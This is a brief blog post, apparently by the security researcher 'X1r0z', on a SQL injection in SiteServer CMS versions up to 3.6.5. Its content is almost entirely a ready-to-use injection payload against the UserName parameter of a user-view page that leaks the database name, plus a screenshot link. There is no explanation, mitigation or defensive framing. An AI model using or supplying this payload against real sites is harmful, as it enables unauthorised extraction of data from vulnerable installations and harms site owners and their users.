---
title: "siteserver SQL 注入"
date: 2018-03-10T00:00:00+08:00
draft: false
tags: ['cms','sqli']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

影响范围 siteserver <= 3.6.5

<!--more-->

**Payload**

`/siteserver/userRole/modal_UserView.aspx?UserName=a' or[areaid]>db_name()--`

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/03/07/1520423900.jpg)